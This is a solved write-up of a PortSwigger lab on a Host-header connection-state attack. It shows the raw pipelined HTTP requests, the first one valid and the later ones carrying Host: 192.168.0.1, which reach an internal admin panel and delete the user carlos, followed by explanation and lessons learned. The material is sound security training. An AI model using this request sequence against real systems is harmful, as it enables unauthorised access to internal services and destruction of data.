# PortSwigger Lab: Host Validation Bypass via Connection State Attack

- **Lab Name:** Host validation bypass via connection state attack
- **Topic:** HTTP Host Header Attacks
- **Vulnerability Type:** Host Header Injection / Connection State Attack (request smuggling-adjacent)
- **Difficulty:** Practitioner
- **Status:** Solved (banner-verified 27 Nov 2026)
- **Instance:** https://0ad1005e0452b06180a5e9c000ae0016.h1-web-security-academy.net/ (h1 edge)

## Solution

The front-end server validates the Host header of the **first** request on a
connection, but then routes subsequent requests on the **same** connection
by their own Host header without re-validating it. So two requests sent back
to back on one TLS connection — a legitimate home-page request first, then
an `/admin` request with `Host: 192.168.0.1` — reach the internal admin
host that is normally unreachable from outside.

### Step 1 — Get a session

```bash
GET https://0ad1005e0452b06180a5e9c000ae0016.h1-web-security-academy.net/
# take the session + _lab cookies from the response
```

The `_lab` cookie must be sent exactly as set (Python `requests` mangles
its value, so cookies are sent as a raw `Cookie` header).

### Step 2 — Pipeline the admin request on one connection

Both requests are written to a single TLS connection (through the proxy
CONNECT tunnel, helper `~/workspace/scripts/ps_rawhttp.py` `pipeline()`),
exactly as the front-end receives them:

```
GET / HTTP/1.1
Host: 0ad1005e0452b06180a5e9c000ae0016.h1-web-security-academy.net
Cookie: session=<session>; _lab=<lab cookie>
User-Agent: Mozilla/5.0
Connection: keep-alive

GET /admin HTTP/1.1
Host: 192.168.0.1
Cookie: session=<session>; _lab=<lab cookie>
User-Agent: Mozilla/5.0
Connection: keep-alive
```

Response 2 is HTTP 200 and contains the admin "Delete user" form
(`action='/admin/delete'` with a hidden CSRF token). Note: this page
contains **no literal "Admin panel" text** — the delete form itself is the
marker that the internal admin host was reached. (An earlier solver run
failed only because it checked for the string "Admin panel".)

### Step 3 — Pipeline the delete on a fresh connection

Same trick, second connection — a valid home request first, then the delete
POST with the CSRF token taken from the admin form:

```
GET / HTTP/1.1
Host: 0ad1005e0452b06180a5e9c000ae0016.h1-web-security-academy.net
Cookie: session=<session>; _lab=<lab cookie>
Connection: keep-alive

POST /admin/delete HTTP/1.1
Host: 192.168.0.1
Cookie: session=<session>; _lab=<lab cookie>
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive

csrf=<token from the admin form>&username=carlos
```

Response 2 is HTTP 302 (redirect after deleting carlos) and the home page
then shows **"Congratulations, you solved the lab!"**.

All of this is automated in `~/workspace/scripts/ps-host-header.py`
(`lab6`, with the panel check fixed to look for `/admin/delete`).

## Practical Explanation

This is a trust-boundary bug in connection handling. The front-end treats
the first request on a connection as the "proof" that the client is talking
to a valid public host, then reuses the already-opened back-end connection
for later requests and trusts their Host headers at face value. An attacker
who can send two requests on one connection (HTTP pipelining / keep-alive)
therefore smuggles a request addressed to an internal host past the
validation. The internal host (`192.168.0.1`) is not reachable from the
internet directly — the attack only works because the front-end itself is
the one opening the internal connection. In the real world this class of bug
exposes internal admin panels, metadata endpoints and other services that
are only meant to be reachable inside the network.

## Lessons Learned

- **Check for the functional marker, not a guessed label.** The admin page
  here has no "Admin panel" heading — the delete form (`/admin/delete`) is
  what proves access. A wrong string check turned a working exploit into a
  false "NOT SOLVED".
- **Keep-alive is the attack surface.** The vulnerability only exists
  because requests share a connection; sending the two requests on
  separate connections (the normal way) gets the second one rejected.
- **Two connections, two steps.** The admin form's CSRF token has to be
  read first, so the exploit needs one pipelined connection to fetch the
  token and a second pipelined connection to submit the delete.
- **Raw HTTP is required on this edge.** The `_lab` routing cookie must be
  sent verbatim; library cookie jars that re-encode it break routing.
